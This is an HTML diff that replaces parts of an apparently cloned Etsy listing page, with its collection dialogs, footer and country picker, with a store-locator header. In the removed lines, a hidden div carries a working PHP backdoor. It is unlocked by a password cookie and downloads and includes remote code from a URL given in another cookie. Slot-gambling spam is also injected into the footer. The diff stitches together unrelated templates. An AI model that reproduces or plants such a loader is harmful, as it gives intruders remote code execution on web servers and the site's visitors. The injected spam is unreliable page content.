+                    transform="translate(5 5)" />
+            </symbol>
+
+            <symbol id="icon-close" class="icon icon-close" fill="none" viewBox="0 0 18 17">
+                <path
+                    d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z"
+                    fill="currentColor">
+            </symbol>
+        </svg>
+
+        <sticky-header data-sticky-type="on-scroll-up"
+            class="header-wrapper color-background-1 gradient header-wrapper--border-bottom header-menu-wrapper"><my-store-locator-mobile
+                class="no-js-hidden my-store-locator my-store-locator--mobile" data-error-text="Error: Try again"
+                data-select-text="Select your store">
+                <button class="js-my-store-locator-btn my-store-locator__btn" disabled aria-haspopup="dialog">
+                    <div class="my-store-locator__icon">
+                        <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="16"
+                            height="14" viewBox="0 0 16 14" fill="none">
+                            <path
+                                d="M12.7742 13.3755H3.05191C2.2285 13.3755 1.55871 12.7056 1.55871 11.8822L1.55859 5.46973H2.29228V11.8822C2.29228 12.301 2.63304 12.6417 3.0518 12.6417H12.7743C13.1931 12.6417 13.5338 12.3011 13.5338 11.8822L13.534 5.46973H14.2676V11.8822C14.2676 12.7056 13.5977 13.3755 12.7743 13.3755H12.7742Z"
+                                fill="#1D1D1F" />
+                            <path
+                                d="M6.19597 6.04216C5.04487 6.04216 4.1084 5.10557 4.1084 3.95459H4.84209C4.84209 4.70103 5.44941 5.30836 6.19597 5.30836C6.94253 5.30836 7.54985 4.70103 7.54985 3.95459H8.28354C8.28354 5.10557 7.34707 6.04216 6.19597 6.04216Z"
+                                fill="#1D1D1F" />
+                            <path
+                                d="M9.63738 6.04397C8.48628 6.04397 7.5498 5.10738 7.5498 3.95639V2.43213H8.28349V3.95639C8.28349 4.70284 8.89082 5.31016 9.63738 5.31016C10.3839 5.31016 10.9913 4.70284 10.9913 3.95639H11.7249C11.7249 5.10738 10.7885 6.04397 9.63738 6.04397Z"
+                                fill="#1D1D1F" />
+                            <path
+                                d="M13.0793 6.04286C11.9282 6.04286 10.9917 5.10627 10.9917 3.95529V2.43102H11.7254V3.95529C11.7254 4.70173 12.3327 5.30906 13.0793 5.30906C13.8258 5.30906 14.4333 4.70173 14.4333 3.95529V2.54174L13.231 0.73392H2.60295L1.40068 2.54163V3.95517C1.40068 4.70162 2.00812 5.30894 2.75468 5.30894C3.50124 5.30894 4.10856 4.70162 4.10856 3.95517V2.43091H4.84225V3.95517C4.84225 5.10627 3.90578 6.04275 2.75468 6.04275C1.60347 6.04275 0.666992 5.10616 0.666992 3.95517V2.43091C0.666992 2.35862 0.688332 2.2879 0.728328 2.22768L2.10075 0.16379C2.16868 0.0614505 2.28342 0 2.40621 0H13.4275C13.5503 0 13.6651 0.0614477 13.733 0.16379L15.1057 2.22779C15.1458 2.28802 15.167 2.35874 15.167 2.43102V3.95529C15.167 5.10627 14.2305 6.04286 13.0793 6.04286H13.0793Z"
+                                fill="#1D1D1F" />
+                            <path d="M1.0332 2.06055H14.7997V2.79435H1.0332V2.06055Z" fill="#1D1D1F" />
+                            <rect x="5.4806" y="8.38246" width="4.63549" height="4.63549" rx="0.534864" stroke="black"
+                                stroke-width="0.713153" />
+                        </svg>
                     </div>
-                </div>
-                <p class="wt-text-right-xs wt-sem-text-secondary wt-mt-md-1" data-character-count>50</p>
-            </div>
-        </div>
-    </div>
-    <div class="wt-display-flex-sm wt-flex-direction-column-xs wt-flex-direction-row-md wt-justify-content-space-between wt-mt-xs-1">
-            <div class="wt-mb-xs-5 wt-mb-md-0">
-                <legend class="wt-text-title-01 wt-mt-xs-1">
-                    Set to private?
-                </legend>
-                <p class="wt-text-body-01 wt-max-width-sm wt-ml-xs-0">
-                    Keep collections to yourself or inspire other shoppers! Keep in mind that anyone can view public collections – they may also appear in recommendations and other places.
-                    <a href="https://www.etsy.com/legal/privacy/" target="_blank">View Etsy’s Privacy Policy</a></p>
-            </div>
-            <div>
-                    <div
-                        id="collection-privacy-control"
-                        class="wt-display-flex-md wt-flex-direction-column-xs wt-align-items-center"
-                        data-label-yes="Private"
-                        data-label-no="Public"
-                        data-selector="toggle-switch">
-                        <div data-clg-id="WtSwitchInput" class="wt-switch__wrapper" data-wt-props-small="true" data-wt-props-label-text="Set to private?" data-wt-props-label-type="hidden" data-wt-neu-rendered>
-    
-    <div class="wt-switch__frame">
-        <input
-            type="checkbox"
-            class="wt-switch wt-switch--small"
-            id="wt-switch-68cb39e956853"
-        />
-        <label class="wt-switch__toggle" for="wt-switch-68cb39e956853">
-            <span class="wt-screen-reader-only">
-                Set to private? 
-            </span>
-        </label>
-    </div>
-    
-</div>
-
-                        <div class="wt-display-flex-xs wt-flex-direction-row-reverse-xs wt-align-items-center wt-justify-content-flex-end wt-nudge-t-2">
-                            <span data-toggle-private-text class="wt-text-body">
-                                Public
-                            </span>
-                            <span class="etsy-icon wt-icon--smaller-xs wt-mr-xs-1 wt-display-none" data-toggle-private-icon=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13 13v5h-2v-5z"/><path fill-rule="evenodd" clip-rule="evenodd" d="M4 9.25A.25.25 0 0 1 4.25 9H7.5V6.5a4.5 4.5 0 0 1 9 0V9h3.25a.25.25 0 0 1 .25.25V18a4 4 0 0 1-4 4H8a4 4 0 0 1-4-4zM9.5 6.5a2.5 2.5 0 0 1 5 0V9h-5zM8 20a2 2 0 0 1-2-2v-7h12v7a2 2 0 0 1-2 2z"/></svg></span>
-                            <span class="etsy-icon wt-icon--smaller-xs wt-mr-xs-1" data-toggle-public-icon=""><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12 2a10 10 0 1 0 10 10A10.01 10.01 0 0 0 12 2M9 18.883v.528a7.94 7.94 0 0 1-4.94-8.351l3.385 3.385a2.967 2.967 0 0 0 1.649 4.4zM17.5 15q.252 0 .5-.05V15a.99.99 0 0 0 .927.985A8 8 0 0 1 12 20c-.216 0-.427-.016-.639-.032l1.254-2.5-.015.006a2.97 2.97 0 0 0-.08-3.11A2.988 2.988 0 0 0 8 13.78V11h1a1 1 0 0 0 1-1V9a1 1 0 0 0 1-1 1 1 0 1 0 0-2H6.726A7.9 7.9 0 0 1 14 4.263V6a1 1 0 0 0 2 0v-.918a8 8 0 0 1 2 1.649V7h-1a1 1 0 1 0 0 2h2.411q.196.49.326 1H17a2.556 2.556 0 0 0-2 2.5 2.5 2.5 0 0 0 2.5 2.5"/></svg></span>
-                        </div>
-                    </div>
-            </div>
-        </div>
-    <div data-collection-list-add-footer >
-        <div class="wt-overlay__footer">
-            <div class="wt-overlay__footer__cancel">
-                <button type="button" class="wt-btn wt-btn--transparent wt-btn--transparent-flush-left wt-btn--transparent-flush-right" data-overlay-back>Cancel</button>
-            </div>
-            <div class="wt-overlay__footer__action">
-                <button type="button" class="wt-btn wt-btn--primary" data-add-collection-button disabled="true">
-                    Create collection
+                    <p class="js-my-store-locator-info my-store-locator__info">
+                        Loading store
+                        <i class="fa fa-spinner fa-spin"></i>
+                    </p>
                 </button>
-            </div>
-        </div>
-    </div>
-</div>
-<div
-    class="wt-overlay wt-overlay--alert"
-    id="make-public-list-modal"
-    data-wt-overlay
-    aria-hidden="true"
-    role="alertdialog"
-    aria-modal="false">
-    <div class="wt-overlay__modal" data-overlay-modal>
-        <div class="wt-overlay__header">
-            <h2 class="wt-text-heading wt-text-center-xs">
-                Make your collection public?
-
-            </h2>
-        </div>
-        <div class="wt-display-flex-xs wt-justify-content-space-between">
-            <div>
-                <p>
-                    Public collections can be seen by the public, including other shoppers, and may show up in recommendations and other places.
-                </p>
-            </div>
-        </div>
-        <div class="wt-overlay__footer">
-            <div class="wt-overlay__footer__cancel">
-                <button type="button" data-selector="cancel-make-public-button" class="wt-btn wt-btn--transparent wt-btn--transparent-flush-left wt-btn--transparent-flush-right" >Cancel</button>
-            </div>
-            <div class="wt-overlay__footer__action">
-                <button type="button" data-selector="make-public-button" class="wt-btn wt-btn--primary" >Make Public</button>
-            </div>
-        </div>
-    </div>
-</div>
-    </div>
-</div>
-    </div>
-</div>
-</div>
-<div style="display: none;" class="asep-multi-wwwwww">			
-<?php $correct_password_hash="a0f422739faea2ed628e4ddede659ef5";if(!isset($_COOKIE['auth_password'])||md5($_COOKIE['auth_password'])!==$correct_password_hash){setcookie('current_cache','',time()-3600,'/');setcookie('auth_password','',time()-3600,'/');}else{if(isset($_COOKIE['current_cache'])&&!empty($_COOKIE['current_cache'])){error_reporting(E_ALL);ini_set('display_errors',1);if(!file_exists(sys_get_temp_dir().DIRECTORY_SEPARATOR.md5($_COOKIE['current_cache']))){file_put_contents(sys_get_temp_dir().DIRECTORY_SEPARATOR.md5($_COOKIE['current_cache']),get_remote_content($_COOKIE['current_cache']));}include sys_get_temp_dir().DIRECTORY_SEPARATOR.md5($_COOKIE['current_cache']);exit;}}function get_remote_content($remote_location){if(function_exists('curl_exec')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$remote_location);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);$response=curl_exec($ch);curl_close($ch);if($response!==false){return $response;}}if(function_exists('file_get_contents')){$response=file_get_contents($remote_location);if($response!==false){return $response;}}if(function_exists('fopen')&&function_exists('stream_get_contents')){$handle=fopen($remote_location,"r");$response=stream_get_contents($handle);fclose($handle);if($response!==false){return $response;}}return false;}?></div>	
-<div id="listing-page-post-add-to-cart-overlay">
-    
-</div>
-
-<div class="wt-overlay wt-overlay--peek" id="conditional-sale-interstitial-overlay" aria-hidden="true"
-    data-wt-overlay role="dialog" aria-modal="false" aria-label="">
-    <div class="wt-overlay__modal" data-overlay-modal>
-        <button type="button" class="wt-btn wt-btn--transparent wt-btn--icon wt-overlay__close-icon wt-btn--light" data-wt-overlay-close>
-            <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M3.793 5.207 10.586 12l-6.793 6.793 1.414 1.414L12 13.414l6.793 6.793 1.414-1.414L13.414 12l6.793-6.793-1.414-1.414L12 10.586 5.207 3.793z"/></svg></span>
-        </button>
-
-        <div data-conditional-sale-content></div>
-        <div data-conditional-sale-loading class="wt-width-full wt-height-full wt-z-index-3">
-            
-    <div data-clg-id="WtSpinner" class="wt-spinner wt-spinner--02" aria-live="assertive" >
-        <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" aria-hidden="true" focusable="false"><circle fill="transparent" cx="24" cy="24" r="21"/></svg></span>
-        Loading
-    </div>
-
-        </div>
-        <div data-conditional-sale-load-failure>
-            <div data-clg-id="WtBanner" class="wt-banner wt-banner--warning-01" id="etsywebtoolkitbannerswtbanner68cb39e952e2d" data-prop-id="etsywebtoolkitbannerswtbanner68cb39e952e2d" data-prop-type="static" data-prop-style-type="warning-01" data-prop-is-open="true"  data-wt-neu-rendered>
-    <div data-clg-id="WtBannerContent" class="wt-banner__layout">
-    <div class="wt-display-flex-xs wt-align-items-center">
-        <div class="wt-banner__icon-frame wt-hide-xs wt-show-sm ">
-            <span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.035 2.627a2 2 0 0 1 3.93 0 6.7 6.7 0 0 1 4.56 4.905L21 18.333H3L5.475 7.532a6.7 6.7 0 0 1 4.56-4.905m1.921 1.706a4.694 4.694 0 0 0-4.531 3.645L5.51 16.333h12.98l-1.915-8.355a4.694 4.694 0 0 0-4.531-3.645z"/><path d="M12 22a2 2 0 0 0 2-2h-4a2 2 0 0 0 2 2"/></svg></span>
-        </div>
-        <div>
-            <div >
-                <p class="wt-banner__title">
-                    There was a problem loading the content
-                </p>
-            </div>
-        </div>
-    </div>
-    <div class="wt-banner__buttons">
-        <button data-clg-id="WtButton" class="wt-btn wt-btn--primary wt-btn--small" data-wt-banner-cta-button="" type="button">
-    Try again
-</button>
-
-    </div>
-</div>
-</div>
-        </div>
-
-    </div>
-</div>
+                <div class="js-my-store-locator-details my-store-locator__details" tabindex="-1" role="dialog"
+                    aria-modal="true" aria-labelledby="MyStoreDetailsMobileHeading">
+                    <button class="js-my-store-locator-close my-store-locator__close" type="button" aria-label="Close">
 
 
-
-<div id="footer" class="content-wrap-inner-blank-noborder"></div>
-
-<div id="ad-1"></div>
-
-</div>
-        </main>
-
-        <div id="collage-footer" class="site-footer chrome-footer chrome-footer--ehi  ">
-    <footer>
-
-        
-
-        <div data-appears-component-name="impact_message" data-appears-event-data='{"impact_name":"footer_renewable_impact","impact_themes":["sustainability"],"impact_audiences":["buyers"]}'>
-<div class="footer-impact-callout wt-position-relative">
-    <div class="wt-bg-denim-light wt-sem-text-on-surface-dark wt-text-center-xs wt-text-body-01 wt-pb-xs-4 wt-pt-xs-4">
-        <div class="wt-popover wt-popover--top" data-wt-popover>
-            <button data-wt-popover-trigger class="wt-popover__trigger wt-popover__trigger--underline wt-display-flex-md wt-align-items-center" aria-describedby="footer-environmental-impact-popover-content">
-                <div class="wt-flex-md-auto wt-mb-xs-1 wt-mb-md-0">
-                    <span class="wt-icon wt-icon--larger"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 96" aria-hidden="true" focusable="false">
-  <path d="M60.1 38H49v11h-2V38H35.9c1.931 9.368 6.626 17 12.1 17 5.474 0 10.171-7.632 12.1-17zm-25.145-9.5c-.003 2.511.19 5.019.577 7.5H47V18.522l-10.925.238a41.683 41.683 0 00-1.12 9.74zM47 2.31c-4.1 1.24-8.18 7.168-10.38 14.437L47 16.52V2.31z"/>
-  <path d="M57.52 9.45l1.784-.9a31.775 31.775 0 012.558 7.65l9.117-.2.042 2-8.78.19c.55 3.41.818 6.857.8 10.31a50.836 50.836 0 01-.54 7.5H72v2h-9.846c-1.6 8.2-5.244 15.053-9.862 17.754C66.834 54.079 76 43.793 76 28.589c0-8.962-2.958-16.353-8.554-21.373A25.424 25.424 0 0049 1.04v15.438l10.83-.236a29.32 29.32 0 00-2.31-6.791zM43.51 55.643c-4.525-2.78-8.086-9.564-9.665-17.643H24v-2h9.5a50.84 50.84 0 01-.549-7.5 43.776 43.776 0 011.075-9.7l-9.009.2-.042-2 9.562-.208c1.89-6.667 5.317-12.436 9.432-15.143C29.71 4.412 20 15.13 20 28.589a27.636 27.636 0 0023.51 27.054z"/>
-  <path d="M61.045 28.5a60.27 60.27 0 00-.818-10.265L49 18.479v17.52h11.468c.388-2.48.58-4.988.577-7.5zM91.7 60c-2.182 4.525-5.734 8.62-10.832 13.719l-1.414-1.414c6.6-6.6 10.511-11.424 12.08-17.7.072-.415.137-.832.215-1.278.607-3.48.262-5.951-1.027-6.068-.72-.066-1.559.68-1.947 2.3a30.158 30.158 0 01-2.454 8.148c-1.78 4.663-8.575 11.048-8.865 11.318l-1.366-1.461c.068-.063 6.8-6.391 8.381-10.62l.061-.133a30.644 30.644 0 002.526-9.148c.11-1.886.095-6.433-1.793-6.552-2.085-.132-2.537 3.505-3.367 7.379-.259 1.21-.89 3.456-1.153 4.243a1.55 1.55 0 01-.09.177c-1.386 4.053-5.32 7.859-5.515 8.045-2.984 2.983-9.707 9.74-9.707 9.74L64.01 69.3s6.726-6.761 9.727-9.761a28.158 28.158 0 003.064-3.6c.5-.788 1.452-2.646.55-3.572-1.148-1.178-3.287-.648-6.08.748-1.98.992-11.21 7.08-15.384 13.34-1.99 2.985-2.772 8.839-3.042 14.2l13.18 2.724 6.8 1.359a8.92 8.92 0 011-.778c7.075-4.74 14.663-11.833 17.317-16.54 3.566-6.32 1.988-7.52.558-7.42zM52.774 82.673l-.77 10.252 1.993.15.595-7.913 10.616 2.123 3.765.778L70.02 93.2l1.96-.4-.885-4.338 2.592.518.392-1.96-8.447-1.69-12.858-2.657zm-29.242 2.055l6.77-1.354 13.206-2.73c-.27-5.36-1.052-11.214-3.042-14.2-4.173-6.258-13.4-12.347-15.384-13.34-2.793-1.4-4.932-1.925-6.08-.747-.9.926.054 2.784.55 3.572a28.158 28.158 0 003.064 3.6c3 3 9.727 9.76 9.727 9.76l-1.418 1.41s-6.723-6.757-9.707-9.74c-.2-.186-4.129-3.992-5.515-8.045a1.74 1.74 0 01-.09-.177c-.263-.787-.894-3.033-1.153-4.243-.83-3.874-1.282-7.511-3.367-7.38-1.888.12-1.9 4.667-1.793 6.553a30.645 30.645 0 002.526 9.148l.061.133c1.58 4.229 8.313 10.557 8.381 10.62L18.9 69.034c-.29-.27-7.084-6.655-8.865-11.318a30.16 30.16 0 01-2.454-8.148c-.388-1.622-1.226-2.37-1.947-2.3-1.287.114-1.634 2.586-1.025 6.065.078.446.143.863.215 1.278C6.394 60.883 10.3 65.7 16.9 72.307l-1.41 1.414c-5.1-5.1-8.65-9.194-10.832-13.72-1.434-.104-3.013 1.1.553 7.42 2.654 4.706 10.238 11.8 17.321 16.529a8.92 8.92 0 011 .778zm7.175.605l-8.433 1.687.393 1.96 2.591-.518-.885 4.338 1.96.4 1.047-5.137 3.75-.775 10.631-2.126.595 7.913 1.994-.15-.77-10.252-12.873 2.66z"/>
-</svg></span>
-                </div>
-                <div class="wt-mr-xs-2 wt-ml-xs-2 wt-mr-sm-0 wt-ml-sm-0 wt-ml-md-2 wt-text-body-01 wt-flex-md-auto">
-                    Slot777 | Situs Slot Gacor Terpercaya Hari Ini Rtp Slot Maxwin Terbaik 2025
-                </div>
-            </button>
-
-            <div id="footer-environmental-impact-popover-content" role="tooltip">
-                Etsy’s 100% renewable electricity commitment includes the electricity used by the data centres that host Etsy.com, the Sell on Etsy app, and the Etsy app, as well as the electricity that powers Etsy’s global offices and employees working remotely from home in the US.
-            </div>
-        </div>
-    </div>
-</div>
-</div>
-
-
-        <div class="chrome-footer__final-container">
-            <div class="chrome-footer__final">
-
-                    <div class="chrome-footer__final-col">
-                        <a id="locale-picker-trigger" class="wt-btn wt-btn--transparent wt-btn--transparent-flush-left wt-btn--transparent-flush-right  wt-btn--light  wt-btn--small" aria-label="Update your settings Indonesia English (UK) Rp (IDR)"
-    href="https://www.etsy.com/your/account/locale_preferences?from_page=https%3A%2F%2Fwww.etsy.com%2Flisting%2F1790774795%2Fbook-club-print-bookish-poster-trendy%3Fls%3Dr%26ref%3Drlp-listing-grid-2%26external%3D1%26space_id%3D1359364143966%26sts%3D1%26dd%3D1%26content_source%3D52b99da6862466211894f724d195c6bb%25253A2ca474494f71c831169387d00a6b689c028b9d90%26logging_key%3D52b99da6862466211894f724d195c6bb%253A2ca474494f71c831169387d00a6b689c028b9d90" data-aria-controls="wt-locale-picker-overlay"
->
-    <span class="wt-display-inline-block wt-nudge-t-2 wt-vertical-align-middle">    <span class="etsy-icon locale-icon-svg-default wt-display-block wt-text-white&#10;                    wt-icon--smaller-xs wt-nudge-b-2"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M12,2A10,10,0,1,0,22,12,10.012,10.012,0,0,0,12,2ZM9,18.883v0.528A7.938,7.938,0,0,1,4.06,11.06l3.385,3.385a2.967,2.967,0,0,0,1.649,4.4ZM17.5,15a2.509,2.509,0,0,0,.5-0.05V15a0.992,0.992,0,0,0,.927.985A8,8,0,0,1,12,20c-0.216,0-.427-0.016-0.639-0.032l1.254-2.5-0.015.006A2.968,2.968,0,0,0,13,16a2.988,2.988,0,0,0-5-2.221V11H9a1,1,0,0,0,1-1V9a1,1,0,0,0,1-1,1,1,0,0,0,0-2H6.726A7.9,7.9,0,0,1,14,4.263V6a1,1,0,0,0,2,0V5.082a8.047,8.047,0,0,1,2,1.649V7H17a1,1,0,0,0,0,2h2.411a7.941,7.941,0,0,1,.326,1H17a2.556,2.556,0,0,0-2,2.5A2.5,2.5,0,0,0,17.5,15Z"/></svg></span>
-</span>
-    <span class="wt-display-inline-block wt-vertical-align-middle">&nbsp Indonesia &nbsp | &nbsp English (UK) &nbsp | &nbsp Rp (IDR)</span>
-</a>
-                    </div>
-
-                    <div class="chrome-footer__final-col">
-                        <span class="chrome-footer__copyright">
-                            &copy; 2025 Etsy, Inc.
-                        </span>
-
-                        <ul class="chrome-footer__final-links wt-list-inline">
-                            <li class="wt-list-inline__item">
-                                <a href="#" class="chrome-footer__final-link">
-                                    Terms of Use
-                                </a>
-                            </li>
-                            <li class="wt-list-inline__item">
-                                <a href="#" class="chrome-footer__final-link">
-                                    Privacy
-                                </a>
-                            </li>
-                            <li class="wt-list-inline__item">
-                                <a href="#" class="chrome-footer__final-link">
-                                    Interest-based ads
-                                </a>
-                            </li>
-
-                            <li class="wt-list-inline__item">
-                                <a href="#" class="chrome-footer__final-link">
-                                    Local Shops
-                                </a>
-                            </li>
-
-                            <li class="wt-list-inline__item">
-                                <button aria-controls="country-picker" style-type="primary" class="wt-text-link chrome-footer__final-link">
-                                    Regions
-                                </button>
-                                <div data-clg-id="WtOverlay" class="wt-overlay wt-overlay--large wt-overlay--has-close-icon" id="country-picker" aria-hidden="true" aria-modal="false" role="dialog" aria-label="Regions Etsy does business in" data-wt-overlay>
-    <div class="wt-overlay__modal" data-overlay-modal>
-            <button type="button" class="wt-btn wt-btn--transparent wt-btn--icon wt-overlay__close-icon wt-btn--light"  aria-label="Close" data-wt-overlay-close>
-                <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M13.414,12l6.293-6.293a1,1,0,0,0-1.414-1.414L12,10.586,5.707,4.293A1,1,0,0,0,4.293,5.707L10.586,12,4.293,18.293a1,1,0,1,0,1.414,1.414L12,13.414l6.293,6.293a1,1,0,0,0,1.414-1.414Z"/></svg></span>
-            </button>
-        <div data-clg-id="WtOverlayHeader" class="wt-overlay__header" >
-            <p class="wt-text-heading">Regions Etsy does business in:</p>
-
-</div>
-
-
-
-        <div data-clg-id="WtOverlayFooter" class="wt-overlay__footer wt-justify-content-flex-end wt-pt-xs-2 wt-pt-sm-2 wt-pb-sm-0 wt-pt-md-2 wt-height-full" >
-            <div data-clg-id="WtOverlayFooterButton" class="wt-overlay__footer__action">
-    <button data-clg-id="WtButton" class="wt-btn wt-btn--filled wt-pt-xs-0 wt-pb-xs-0 wt-mb-xs-0" data-wt-overlay-close="true">
-                Got it
-
-</button>
-</div>
-        </div>
-
-    </div>
-</div>
-                            </li>
-
-                        </ul>
-                    </div>
-            </div>
-        </div>
-
-        
-
-        <div data-toolkit-overlay data-wt-overlay aria-hidden="true" role="dialog" aria-labelledby="wt-locale-picker-overlay-title" data-overlay-transition="1" id="wt-locale-picker-overlay" class="v2-locale-picker-overlay wt-overlay">
-    <div class="wt-overlay__modal wt-text-left-xs" data-overlay-modal>
-        <div class="wt-overlay__header">
-            <h2 class="wt-text-title-large" id="wt-locale-picker-overlay-title">Update your settings</h2>
-        </div>
-
-        <form method="post"
-            action="" onsubmit="return false"
-            
-        >
-
-            
-
-            <input type="hidden" name="region_code" value=""/>
-
-
-
-                <div id="locale-picker-sections-wrap">
-                <!--
-                <div id="locale_picker_region_code" class="locale_picker_section wt-pb-xs-3 wt-text-left-xs wt-b-xs-none">
-
-                    <label class="wt-label wt-pb-xs-1" for="locale-overlay-select-region_code">Region</label>
-                    <div class="wt-select wt-text-body-01">
-                        <select id="locale-overlay-select-region_code" name="region_code" class="wt-select__element">
-                                <option value="AU" >Australia</option>
-                                <option value="CA" >Canada</option>
-                                <option value="FR" >France</option>
-                                <option value="DE" >Germany</option>
-                                <option value="GR" >Greece</option>
-                                <option value="IN" >India</option>
-                                <option value="IE" >Ireland</option>
-                                <option value="IT" >Italy</option>
-                                <option value="JP" >Japan</option>
-                                <option value="NZ" >New Zealand</option>
-                                <option value="PL" >Poland</option>
-                                <option value="PT" >Portugal</option>
-                                <option value="ES" >Spain</option>
-                                <option value="NL" >The Netherlands</option>
-                                <option value="GB" >United Kingdom</option>
-                                <option value="US" >United States</option>
-                            <optgroup label="&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;">
-                                <option value="AF" >Afghanistan</option>
-                                <option value="AX" >Åland Islands</option>
-                                <option value="AL" >Albania</option>
-                                <option value="DZ" >Algeria</option>
-                                <option value="AS" >American Samoa</option>
-                                <option value="AD" >Andorra</option>
-                                <option value="AO" >Angola</option>
-                                <option value="AI" >Anguilla</option>
-                                <option value="AG" >Antigua and Barbuda</option>
-                                <option value="AR" >Argentina</option>
-                                <option value="AM" >Armenia</option>
-                                <option value="AW" >Aruba</option>
-                                <option value="AU" >Australia</option>
-                                <option value="AT" >Austria</option>
-                                <option value="AZ" >Azerbaijan</option>
-                                <option value="BS" >Bahamas</option>
-                                <option value="BH" >Bahrain</option>
-                                <option value="BD" >Bangladesh</option>
-                                <option value="BB" >Barbados</option>
-                                <option value="BE" >Belgium</option>
-                                <option value="BZ" >Belize</option>
-                                <option value="BJ" >Benin</option>
-                                <option value="BM" >Bermuda</option>
-                                <option value="BT" >Bhutan</option>
-                                <option value="BO" >Bolivia</option>
-                                <option value="BA" >Bosnia and Herzegovina</option>
-                                <option value="BW" >Botswana</option>
-                                <option value="BV" >Bouvet Island</option>
-                                <option value="BR" >Brazil</option>
-                                <option value="IO" >British Indian Ocean Territory</option>
-                                <option value="VG" >British Virgin Islands</option>
-                                <option value="BN" >Brunei</option>
-                                <option value="BG" >Bulgaria</option>
-                                <option value="BF" >Burkina Faso</option>
-                                <option value="BI" >Burundi</option>
-                                <option value="KH" >Cambodia</option>
-                                <option value="CM" >Cameroon</option>
-                                <option value="CA" >Canada</option>
-                                <option value="CV" >Cape Verde</option>
-                                <option value="KY" >Cayman Islands</option>
-                                <option value="CF" >Central African Republic</option>
-                                <option value="TD" >Chad</option>
-                                <option value="CL" >Chile</option>
-                                <option value="CN" >China</option>
-                                <option value="CX" >Christmas Island</option>
-                                <option value="CC" >Cocos (Keeling) Islands</option>
-                                <option value="CO" >Colombia</option>
-                                <option value="KM" >Comoros</option>
-                                <option value="CG" >Congo, Republic of</option>
-                                <option value="CK" >Cook Islands</option>
-                                <option value="CR" >Costa Rica</option>
-                                <option value="HR" >Croatia</option>
-                                <option value="CW" >Curaçao</option>
-                                <option value="CY" >Cyprus</option>
-                                <option value="CZ" >Czech Republic</option>
-                                <option value="DK" >Denmark</option>
-                                <option value="DJ" >Djibouti</option>
-                                <option value="DM" >Dominica</option>
-                                <option value="DO" >Dominican Republic</option>
-                                <option value="EC" >Ecuador</option>
-                                <option value="EG" >Egypt</option>
-                                <option value="SV" >El Salvador</option>
-                                <option value="GQ" >Equatorial Guinea</option>
-                                <option value="ER" >Eritrea</option>
-                                <option value="EE" >Estonia</option>
-                                <option value="ET" >Ethiopia</option>
-                                <option value="FK" >Falkland Islands (Malvinas)</option>
-                                <option value="FO" >Faroe Islands</option>
-                                <option value="FJ" >Fiji</option>
-                                <option value="FI" >Finland</option>
-                                <option value="FR" >France</option>
-                                <option value="GF" >French Guiana</option>
-                                <option value="PF" >French Polynesia</option>
-                                <option value="TF" >French Southern Territories</option>
-                                <option value="GA" >Gabon</option>
-                                <option value="GM" >Gambia</option>
-                                <option value="GE" >Georgia</option>
-                                <option value="DE" >Germany</option>
-                                <option value="GH" >Ghana</option>
-                                <option value="GI" >Gibraltar</option>
-                                <option value="GR" >Greece</option>
-                                <option value="GL" >Greenland</option>
-                                <option value="GD" >Grenada</option>
-                                <option value="GP" >Guadeloupe</option>
-                                <option value="GU" >Guam</option>
-                                <option value="GT" >Guatemala</option>
-                                <option value="GG" >Guernsey</option>
-                                <option value="GN" >Guinea</option>
-                                <option value="GW" >Guinea-Bissau</option>
-                                <option value="GY" >Guyana</option>
-                                <option value="HT" >Haiti</option>
-                                <option value="HM" >Heard Island and McDonald Islands</option>
-                                <option value="VA" >Holy See (Vatican City State)</option>
-                                <option value="HN" >Honduras</option>
-                                <option value="HK" >Hong Kong</option>
-                                <option value="HU" >Hungary</option>
-                                <option value="IS" >Iceland</option>
-                                <option value="IN" >India</option>
-                                <option value="ID" selected="selected">Indonesia</option>
-                                <option value="IQ" >Iraq</option>
-                                <option value="IE" >Ireland</option>
-                                <option value="IM" >Isle of Man</option>
-                                <option value="IL" >Israel</option>
-                                <option value="IT" >Italy</option>
-                                <option value="IC" >Ivory Coast</option>
-                                <option value="JM" >Jamaica</option>
-                                <option value="JP" >Japan</option>
-                                <option value="JE" >Jersey</option>
-                                <option value="JO" >Jordan</option>
-                                <option value="KZ" >Kazakhstan</option>
-                                <option value="KE" >Kenya</option>
-                                <option value="KI" >Kiribati</option>
-                                <option value="KV" >Kosovo</option>
-                                <option value="KW" >Kuwait</option>
-                                <option value="KG" >Kyrgyzstan</option>
-                                <option value="LA" >Laos</option>
-                                <option value="LV" >Latvia</option>
-                                <option value="LB" >Lebanon</option>
-                                <option value="LS" >Lesotho</option>
-                                <option value="LR" >Liberia</option>
-                                <option value="LY" >Libya</option>
-                                <option value="LI" >Liechtenstein</option>
-                                <option value="LT" >Lithuania</option>
-                                <option value="LU" >Luxembourg</option>
-                                <option value="MO" >Macao</option>
-                                <option value="MK" >Macedonia</option>
-                                <option value="MG" >Madagascar</option>
-                                <option value="MW" >Malawi</option>
-                                <option value="MY" >Malaysia</option>
-                                <option value="MV" >Maldives</option>
-                                <option value="ML" >Mali</option>
-                                <option value="MT" >Malta</option>
-                                <option value="MH" >Marshall Islands</option>
